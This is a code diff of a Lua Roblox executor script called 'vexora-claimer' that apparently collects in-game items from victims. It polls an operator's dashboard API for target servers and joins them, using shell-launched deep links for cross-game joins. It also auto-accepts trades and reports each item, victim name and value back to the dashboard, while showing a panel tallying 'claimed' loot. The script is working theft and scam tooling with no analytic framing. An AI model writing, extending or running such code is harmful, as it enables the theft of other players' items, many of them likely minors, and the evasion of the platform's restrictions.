@@ -6,7 +6,7 @@
   back after every teleport.
 ]]
 
-local CLAIMER_REV = "1.4"
+local CLAIMER_REV = "1.5"
 local API_BASE = "{{API_BASE}}"
 local API_KEY = "{{API_KEY}}"
 local ENDPOINT = "{{ENDPOINT}}"
@@ -27,7 +27,11 @@ if settings.autoAccept == nil then settings.autoAccept = AUTO_ACCEPT end
 settings.enabled = settings.autoExecute
 if getgenv then getgenv().VexoraClaimerSettings = settings end
 
-local ui = { state = "starting", polls = 0, queue = 0, target = nil, lastCapture = nil, error = nil, joinError = nil }
+local ui = {
+    state = "starting", polls = 0, queue = 0, target = nil, lastCapture = nil,
+    error = nil, joinError = nil, joinLink = nil, joinNotice = nil,
+    claimed = {}, claimCount = 0, claimValue = 0,
+}
 local joinBackoff = 0
 local nextJoinAt = 0
 
@@ -46,7 +50,7 @@ local GAME_MAP = {
     [126884695634066] = "gag2",
     [109983668079237] = "sab",
 }
-local GAME = GAME_MAP[PLACE] or GAME_MAP[game.GameId] or "baddies"
+local GAME = GAME_MAP[PLACE] or GAME_MAP[game.GameId] or "other"
 
 local httpRequest
 if typeof(request) == "function" then
@@ -167,18 +171,37 @@ local function itemIn(args, victim)
 end
 
 local function capture(item, victim, value)
+    local amount = tonumber(value) or 1
+    local name = tostring(item)
+    local from = tostring(victim or "Unknown victim")
     report({
         game = GAME,
-        item = tostring(item),
-        victim = tostring(victim or "Unknown victim"),
-        value = tonumber(value) or 1,
+        item = name,
+        victim = from,
+        value = amount,
         place_id = PLACE,
         server_id = HERE,
         executor = "vexora-claimer",
         roblox_user = ME,
     })
-    ui.lastCapture = tostring(item) .. " <- " .. tostring(victim or "?")
-    print(string.format("[vexora-claimer] captured %s from %s", tostring(item), tostring(victim)))
+    report({
+        event = "claimed",
+        game = GAME,
+        item = name,
+        victim = from,
+        value = amount,
+        place_id = PLACE,
+        server_id = HERE,
+        executor = "vexora-claimer",
+        roblox_user = ME,
+    })
+    table.insert(ui.claimed, 1, { item = name, victim = from, value = amount, at = os.time() })
+    if #ui.claimed > 20 then table.remove(ui.claimed) end
+    ui.claimCount = (tonumber(ui.claimCount) or 0) + 1
+    ui.claimValue = (tonumber(ui.claimValue) or 0) + amount
+    ui.lastCapture = name .. " <- " .. from
+    ui.joinNotice = "claimed " .. name
+    print(string.format("[vexora-claimer] captured %s from %s", name, from))
 end
 
 --[[ ---- accept any incoming trade request ---- ]]
@@ -419,6 +442,58 @@ local function reportJoinFailure(target, message)
     end)
 end
 
+local function joinUrl(target, web)
+    if not target or not target.place_id or not target.server_id then return nil end
+    local server = encode(target.server_id)
+    if web then
+        return "https://www.roblox.com/games/start?placeId=" .. tostring(target.place_id)
+            .. "&gameInstanceId=" .. server
+    end
+    return "roblox://placeId=" .. tostring(target.place_id) .. "&gameInstanceId=" .. server
+end
+
+local function copyText(text)
+    if typeof(setclipboard) == "function" then return pcall(setclipboard, text) end
+    if typeof(toclipboard) == "function" then return pcall(toclipboard, text) end
+    if typeof(set_clipboard) == "function" then return pcall(set_clipboard, text) end
+    if typeof(syn) == "table" and typeof(syn.set_clipboard) == "function" then
+        return pcall(syn.set_clipboard, text)
+    end
+    return false
+end
+
+local function shell(command)
+    if typeof(os) ~= "table" or typeof(os.execute) ~= "function" then return false end
+    local ok, first, _, code = pcall(os.execute, command)
+    if not ok then return false end
+    return first == true or first == 0 or code == 0
+end
+
+-- 773 is Roblox refusing a teleport that crosses experiences. a deep link is a
+-- normal join request, not an in-game teleport, so it can hand the same account
+-- to a different game and a specific server.
+local function externalJoin(target)
+    local deep, web = joinUrl(target, false), joinUrl(target, true)
+    if not deep then return false end
+    ui.joinLink = web
+
+    local launched = shell('start "" "' .. deep .. '"')
+        or shell('open "' .. deep .. '"')
+        or shell('xdg-open "' .. deep .. '"')
+
+    if not launched then
+        local gui = game:GetService("GuiService")
+        if gui and typeof(gui.OpenBrowserWindow) == "function" then
+            local ok = pcall(function() gui:OpenBrowserWindow(web) end)
+            launched = ok
+        end
+    end
+
+    if not launched then copyText(web) end
+    print(string.format("[vexora-claimer] external join %s | %s", launched and "opened" or "copied", web))
+    return launched
+end
+
 local function joinTarget(target)
     if not target or not target.place_id or not target.server_id then
         return false, "target is missing its place or server id"
@@ -437,6 +512,20 @@ local function joinTarget(target)
     ui.joinError = nil
     local crossGame = tonumber(target.place_id) ~= PLACE_ID
     if crossGame then
+        ui.joinError = "cross-game: opening a direct join"
+        heartbeat("joining", target.server_id)
+        local allowed = not (getgenv and getgenv().VexoraNoExternal)
+        if allowed and externalJoin(target) then
+            ui.state = "handoff"
+            ui.joinError = "opened in a new client — keep autoexec on"
+            nextJoinAt = os.time() + 300
+            return false, "handoff"
+        end
+        if allowed then
+            ui.joinError = "join link copied — open it on this PC"
+            nextJoinAt = os.time() + 120
+            return false, "join link copied"
+        end
         ui.joinError = "cross-game: run the claimer inside that game"
     end
     heartbeat("joining", target.server_id)
@@ -574,10 +663,32 @@ local function getTarget()
     return body
 end
 
+-- pull the durable claim history so the panel is populated after a reload
+local function loadClaimed()
+    local res = http("GET", API_BASE .. "/api/claimer/claimed")
+    if not res or res.status ~= 200 or type(res.body) ~= "table" then return end
+    local rows = res.body.claimed
+    if type(rows) ~= "table" then return end
+    ui.claimed = {}
+    for index = 1, math.min(#rows, 20) do
+        local row = rows[index]
+        if type(row) == "table" then
+            table.insert(ui.claimed, {
+                item = tostring(row.item or "?"),
+                victim = tostring(row.victim or "?"),
+                value = tonumber(row.value) or 0,
+                at = tonumber(row.at) or 0,
+            })
+        end
+    end
+    ui.claimCount = tonumber(res.body.total) or #ui.claimed
+    ui.claimValue = tonumber(res.body.value) or 0
+end
+
 --[[ ---- in-game menu ---- ]]
 local uiApi = {}
 
-local function buildUi()
+local function buildLegacyUi()
     local playerGui = LocalPlayer and LocalPlayer:FindFirstChildOfClass("PlayerGui")
     if not playerGui then return end
 
@@ -774,6 +885,359 @@ local function buildUi()
     setOpen(true)
 end
 
+local function buildUi()
+    local playerGui = LocalPlayer and LocalPlayer:FindFirstChildOfClass("PlayerGui")
+    if not playerGui then return end
+    local old = playerGui:FindFirstChild("VexoraClaimerUI")
+    if old then old:Destroy() end
+
+    local screen = Instance.new("ScreenGui")
+    screen.Name = "VexoraClaimerUI"
+    screen.ResetOnSpawn = false
+    screen.IgnoreGuiInset = true
+    screen.DisplayOrder = 9999
+    screen.Parent = playerGui
+
+    local function new(class, props, parent)
+        local obj = Instance.new(class)
+        for key, value in pairs(props) do pcall(function() obj[key] = value end) end
+        obj.Parent = parent
+        return obj
+    end
+    local function round(obj, radius)
+        local corner = Instance.new("UICorner")
+        corner.CornerRadius = UDim.new(0, radius or 8)
+        corner.Parent = obj
+    end
+    local function outline(obj, color, transparency)
+        local stroke = Instance.new("UIStroke")
+        stroke.Color = color or Color3.fromRGB(52, 52, 72)
+        stroke.Transparency = transparency or 0.45
+        stroke.Thickness = 1
+        stroke.Parent = obj
+    end
+    local function gradient(obj, first, second, rotation)
+        local g = Instance.new("UIGradient")
+        g.Color = ColorSequence.new(first, second)
+        g.Rotation = rotation or 0
+        g.Parent = obj
+    end
+    local function moneyText(value)
+        local n = tonumber(value) or 0
+        if n >= 1000000 then return string.format("$%.1fm", n / 1000000) end
+        if n >= 1000 then return string.format("$%.1fk", n / 1000) end
+        return "$" .. tostring(math.floor(n))
+    end
+
+    local bg = Color3.fromRGB(11, 11, 17)
+    local panel = Color3.fromRGB(22, 22, 32)
+    local panel2 = Color3.fromRGB(30, 30, 43)
+    local ink = Color3.fromRGB(238, 238, 247)
+    local dim = Color3.fromRGB(148, 148, 172)
+    local accent = Color3.fromRGB(124, 92, 250)
+    local cyan = Color3.fromRGB(56, 189, 248)
+    local green = Color3.fromRGB(34, 197, 94)
+    local red = Color3.fromRGB(239, 68, 68)
+    local gold = Color3.fromRGB(250, 204, 21)
+
+    local float = new("TextButton", {
+        Name = "Open", Size = UDim2.fromOffset(48, 32), Position = UDim2.fromOffset(16, 16),
+        BackgroundColor3 = accent, Text = "V", TextSize = 17, Font = Enum.Font.GothamBold,
+        TextColor3 = Color3.new(1, 1, 1), AutoButtonColor = false,
+    }, screen)
+    round(float, 10)
+    gradient(float, accent, cyan, 35)
+    outline(float, Color3.new(1, 1, 1), 0.75)
+
+    local frame = new("Frame", {
+        Name = "Window", Size = UDim2.fromOffset(348, 470), Position = UDim2.fromOffset(16, 54),
+        BackgroundColor3 = bg, BorderSizePixel = 0,
+    }, screen)
+    round(frame, 14)
+    outline(frame, Color3.fromRGB(58, 58, 82), 0.35)
+
+    local header = new("Frame", {
+        Size = UDim2.new(1, 0, 0, 46), BackgroundColor3 = panel, BorderSizePixel = 0,
+    }, frame)
+    round(header, 12)
+    gradient(header, Color3.fromRGB(38, 30, 62), Color3.fromRGB(18, 18, 27), 90)
+
+    new("TextLabel", {
+        BackgroundTransparency = 1, Position = UDim2.fromOffset(13, 7), Size = UDim2.new(1, -150, 0, 17),
+        Font = Enum.Font.GothamBold, TextSize = 13, TextXAlignment = Enum.TextXAlignment.Left,
+        TextColor3 = ink, Text = "VEXORA CLAIMER",
+    }, header)
+    new("TextLabel", {
+        BackgroundTransparency = 1, Position = UDim2.fromOffset(13, 25), Size = UDim2.new(1, -150, 0, 14),
+        Font = Enum.Font.Code, TextSize = 10, TextXAlignment = Enum.TextXAlignment.Left,
+        TextColor3 = dim, Text = "rev " .. CLAIMER_REV .. "  ·  " .. ME,
+    }, header)
+
+    local statusPill = new("Frame", {
+        Size = UDim2.fromOffset(96, 22), Position = UDim2.new(1, -134, 0, 12),
+        BackgroundColor3 = panel2, BorderSizePixel = 0,
+    }, header)
+    round(statusPill, 11)
+    outline(statusPill, Color3.fromRGB(60, 60, 84), 0.35)
+    local dot = new("Frame", {
+        Size = UDim2.fromOffset(7, 7), Position = UDim2.fromOffset(9, 7),
+        BackgroundColor3 = gold, BorderSizePixel = 0,
+    }, statusPill)
+    round(dot, 4)
+    local statusText = new("TextLabel", {
+        BackgroundTransparency = 1, Position = UDim2.fromOffset(21, 3), Size = UDim2.new(1, -25, 0, 16),
+        Font = Enum.Font.GothamBold, TextSize = 10, TextXAlignment = Enum.TextXAlignment.Left,
+        TextColor3 = ink, Text = "starting",
+    }, statusPill)
+
+    local close = new("TextButton", {
+        Size = UDim2.fromOffset(26, 26), Position = UDim2.new(1, -33, 0, 10),
+        BackgroundColor3 = Color3.fromRGB(45, 45, 62), Text = "x", TextSize = 13,
+        Font = Enum.Font.GothamBold, TextColor3 = ink, AutoButtonColor = false,
+    }, header)
+    round(close, 8)
+
+    local content = new("Frame", {
+        Position = UDim2.fromOffset(0, 50), Size = UDim2.new(1, 0, 1, -50), BackgroundTransparency = 1,
+    }, frame)
+
+    local targetCard = new("Frame", {
+        Position = UDim2.fromOffset(12, 0), Size = UDim2.new(1, -24, 0, 74),
+        BackgroundColor3 = panel2, BorderSizePixel = 0,
+    }, content)
+    round(targetCard, 10)
+    outline(targetCard, Color3.fromRGB(54, 54, 74), 0.4)
+    new("TextLabel", {
+        BackgroundTransparency = 1, Position = UDim2.fromOffset(11, 7), Size = UDim2.new(1, -22, 0, 12),
+        Font = Enum.Font.GothamBold, TextSize = 9, TextXAlignment = Enum.TextXAlignment.Left,
+        TextColor3 = accent, Text = "TARGET",
+    }, targetCard)
+    local targetTitle = new("TextLabel", {
+        BackgroundTransparency = 1, Position = UDim2.fromOffset(11, 20), Size = UDim2.new(1, -22, 0, 22),
+        Font = Enum.Font.GothamBold, TextSize = 15, TextXAlignment = Enum.TextXAlignment.Left,
+        TextColor3 = ink, Text = "No target yet", TextTruncate = Enum.TextTruncate.AtEnd,
+    }, targetCard)
+    local targetSub = new("TextLabel", {
+        BackgroundTransparency = 1, Position = UDim2.fromOffset(11, 45), Size = UDim2.new(1, -22, 0, 20),
+        Font = Enum.Font.Code, TextSize = 10, TextXAlignment = Enum.TextXAlignment.Left,
+        TextColor3 = dim, Text = "waiting for a client hit", TextTruncate = Enum.TextTruncate.AtEnd,
+    }, targetCard)
+
+    local function statCard(x, title)
+        local card = new("Frame", {
+            Position = UDim2.fromOffset(x, 82), Size = UDim2.fromOffset(102, 48),
+            BackgroundColor3 = panel2, BorderSizePixel = 0,
+        }, content)
+        round(card, 9)
+        outline(card, Color3.fromRGB(52, 52, 72), 0.45)
+        local value = new("TextLabel", {
+            BackgroundTransparency = 1, Position = UDim2.fromOffset(10, 7), Size = UDim2.new(1, -20, 0, 21),
+            Font = Enum.Font.GothamBold, TextSize = 17, TextXAlignment = Enum.TextXAlignment.Left,
+            TextColor3 = ink, Text = "0",
+        }, card)
+        new("TextLabel", {
+            BackgroundTransparency = 1, Position = UDim2.fromOffset(10, 29), Size = UDim2.new(1, -20, 0, 12),
+            Font = Enum.Font.GothamBold, TextSize = 8, TextXAlignment = Enum.TextXAlignment.Left,
+            TextColor3 = dim, Text = title,
+        }, card)
+        return value
+    end
+    local queueStat = statCard(12, "QUEUE")
+    local claimStat = statCard(122, "CLAIMED")
+    local valueStat = statCard(232, "VALUE")
+
+    new("TextLabel", {
+        BackgroundTransparency = 1, Position = UDim2.fromOffset(12, 140), Size = UDim2.fromOffset(100, 14),
+        Font = Enum.Font.GothamBold, TextSize = 9, TextXAlignment = Enum.TextXAlignment.Left,
+        TextColor3 = dim, Text = "CLAIMED",
+    }, content)
+    local claimedBadge = new("TextLabel", {
+        BackgroundColor3 = Color3.fromRGB(44, 36, 70), Position = UDim2.new(1, -52, 0, 139),
+        Size = UDim2.fromOffset(40, 16), Font = Enum.Font.GothamBold, TextSize = 9,
+        TextColor3 = ink, Text = "0", BackgroundTransparency = 0,
+    }, content)
+    round(claimedBadge, 8)
+
+    local claimRows = {}
+    for index = 1, 5 do
+        local row = new("Frame", {
+            Position = UDim2.fromOffset(12, 158 + (index - 1) * 17), Size = UDim2.new(1, -24, 0, 16),
+            BackgroundTransparency = 1,
+        }, content)
+        local name = new("TextLabel", {
+            BackgroundTransparency = 1, Position = UDim2.fromOffset(0, 0), Size = UDim2.new(1, -75, 0, 16),
+            Font = Enum.Font.Gotham, TextSize = 10, TextXAlignment = Enum.TextXAlignment.Left,
+            TextColor3 = ink, Text = "", TextTruncate = Enum.TextTruncate.AtEnd,
+        }, row)
+        local value = new("TextLabel", {
+            BackgroundTransparency = 1, Position = UDim2.new(1, -70, 0, 0), Size = UDim2.fromOffset(70, 16),
+            Font = Enum.Font.Code, TextSize = 10, TextXAlignment = Enum.TextXAlignment.Right,
+            TextColor3 = green, Text = "",
+        }, row)
+        table.insert(claimRows, { name = name, value = value })
+    end
+    local emptyClaim = new("TextLabel", {
+        BackgroundTransparency = 1, Position = UDim2.fromOffset(12, 158), Size = UDim2.new(1, -24, 0, 16),
+        Font = Enum.Font.Gotham, TextSize = 10, TextXAlignment = Enum.TextXAlignment.Left,
+        TextColor3 = dim, Text = "No claims yet — trades will show up here",
+    }, content)
+
+    local function toggleRow(textValue, y, isOn, onChange)
+        local row = new("Frame", {
+            Position = UDim2.fromOffset(12, y), Size = UDim2.new(1, -24, 0, 28),
+            BackgroundColor3 = panel2, BorderSizePixel = 0,
+        }, content)
+        round(row, 9)
+        outline(row, Color3.fromRGB(50, 50, 70), 0.55)
+        new("TextLabel", {
+            BackgroundTransparency = 1, Position = UDim2.fromOffset(11, 5),
+            Size = UDim2.new(1, -70, 0, 18), Font = Enum.Font.Gotham, TextSize = 11,
+            TextXAlignment = Enum.TextXAlignment.Left, TextColor3 = ink, Text = textValue,
+        }, row)
+        local pill = new("TextButton", {
+            Position = UDim2.new(1, -57, 0, 5), Size = UDim2.fromOffset(46, 18),
+            BackgroundColor3 = isOn and green or red, Text = isOn and "ON" or "OFF",
+            TextSize = 9, Font = Enum.Font.GothamBold, TextColor3 = Color3.new(1, 1, 1),
+            AutoButtonColor = false,
+        }, row)
+        round(pill, 7)
+        pill.MouseButton1Click:Connect(function()
+            isOn = not isOn
+            pill.Text = isOn and "ON" or "OFF"
+            pill.BackgroundColor3 = isOn and green or red
+            onChange(isOn)
+        end)
+    end
+
+    toggleRow("Auto claimer", 254, settings.enabled, function(value)
+        settings.enabled = value
+        ui.state = value and "polling" or "off"
+        setDashboardArmed(value)
+        if uiApi.update then uiApi.update() end
+    end)
+    toggleRow("Auto execute on load", 286, settings.autoExecute, function(value)
+        settings.autoExecute = value
+    end)
+    toggleRow("Auto accept trades", 318, settings.autoAccept, function(value)
+        settings.autoAccept = value
+        AUTO_ACCEPT = value
+    end)
+
+    local poll = new("TextButton", {
+        Position = UDim2.fromOffset(12, 356), Size = UDim2.fromOffset(150, 32),
+        BackgroundColor3 = accent, Text = "Poll dashboard now", TextSize = 11,
+        Font = Enum.Font.GothamBold, TextColor3 = Color3.new(1, 1, 1), AutoButtonColor = false,
+    }, content)
+    round(poll, 9)
+    gradient(poll, accent, cyan, 25)
+    poll.MouseButton1Click:Connect(function()
+        task.spawn(function()
+            getTarget()
+            if uiApi.update then uiApi.update() end
+        end)
+    end)
+
+    local copy = new("TextButton", {
+        Position = UDim2.fromOffset(170, 356), Size = UDim2.fromOffset(166, 32),
+        BackgroundColor3 = panel2, Text = "Copy join link", TextSize = 11,
+        Font = Enum.Font.GothamBold, TextColor3 = ink, AutoButtonColor = false,
+    }, content)
+    round(copy, 9)
+    outline(copy, Color3.fromRGB(60, 60, 84), 0.35)
+    copy.MouseButton1Click:Connect(function()
+        local link = ui.joinLink or (ui.target and joinUrl(ui.target, true))
+        if not link then
+            ui.joinNotice = "no target yet"
+        else
+            local ok = copyText(link)
+            ui.joinNotice = ok and "join link copied" or "clipboard unavailable — see console"
+            if not ok then print("[vexora-claimer] join link: " .. link) end
+        end
+        if uiApi.update then uiApi.update() end
+    end)
+
+    local footer = new("TextLabel", {
+        BackgroundTransparency = 1, Position = UDim2.fromOffset(12, 404), Size = UDim2.new(1, -24, 0, 16),
+        Font = Enum.Font.Code, TextSize = 9, TextXAlignment = Enum.TextXAlignment.Left,
+        TextColor3 = dim, Text = "api " .. API_BASE, TextTruncate = Enum.TextTruncate.AtEnd,
+    }, content)
+
+    local function setOpen(open)
+        frame.Visible = open
+        float.Visible = not open
+    end
+    close.MouseButton1Click:Connect(function() setOpen(false) end)
+    float.MouseButton1Click:Connect(function() setOpen(true) end)
+
+    local dragging, dragStart, startPos = false, nil, nil
+    header.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1
+            or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            dragStart = input.Position
+            startPos = frame.Position
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then dragging = false end
+            end)
+        end
+    end)
+    game:GetService("UserInputService").InputChanged:Connect(function(input)
+        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement
+            or input.UserInputType == Enum.UserInputType.Touch) then
+            local delta = input.Position - dragStart
+            frame.Position = UDim2.new(
+                startPos.X.Scale, startPos.X.Offset + delta.X,
+                startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        end
+    end)
+
+    uiApi.update = function()
+        if not frame.Parent then return end
+        local state = tostring(ui.state or "starting")
+        statusText.Text = state:sub(1, 13)
+        local color = green
+        if state == "failed" or state == "offline" or state == "off" then
+            color = red
+        elseif state == "joining" or state == "handoff" or state == "paused" then
+            color = gold
+        end
+        dot.BackgroundColor3 = color
+        statusText.TextColor3 = color
+
+        local target = ui.target
+        targetTitle.Text = target and tostring(target.item or "?") or "No target yet"
+        local errorText = ui.error or ui.joinError
+        if errorText then
+            targetSub.Text = tostring(errorText)
+            targetSub.TextColor3 = red
+        elseif target then
+            targetSub.Text = string.format("%s  ·  %s  ·  %s",
+                moneyText(target.value), tostring(target.server_id or ""):sub(1, 10), tostring(GAME))
+            targetSub.TextColor3 = dim
+        else
+            targetSub.Text = "waiting for a client hit"
+            targetSub.TextColor3 = dim
+        end
+
+        queueStat.Text = tostring(ui.queue or 0)
+        claimStat.Text = tostring(ui.claimCount or #ui.claimed)
+        valueStat.Text = moneyText(ui.claimValue)
+        claimedBadge.Text = tostring(ui.claimCount or #ui.claimed)
+
+        for index, row in ipairs(claimRows) do
+            local entry = ui.claimed[index]
+            row.name.Text = entry and tostring(entry.item) or ""
+            row.value.Text = entry and ((tonumber(entry.value) or 0) > 0 and moneyText(entry.value) or "—") or ""
+            row.name.Visible = entry ~= nil
+            row.value.Visible = entry ~= nil
+        end
+        emptyClaim.Visible = #ui.claimed == 0
+        footer.Text = ui.joinNotice or ("api " .. API_BASE)
+    end
+
+    setOpen(true)
+end
+
 pcall(buildUi)
 
 print(string.format("[vexora-claimer] rev %s | %s | game=%s | server=%s | api=%s",
@@ -785,6 +1249,10 @@ heartbeat("starting")
 -- leave a second switch to find on another device.
 setDashboardArmed(settings.enabled)
 if uiApi.update then pcall(uiApi.update) end
+task.spawn(function()
+    loadClaimed()
+    if uiApi.update then pcall(uiApi.update) end
+end)
 
 task.spawn(function()
     while running do
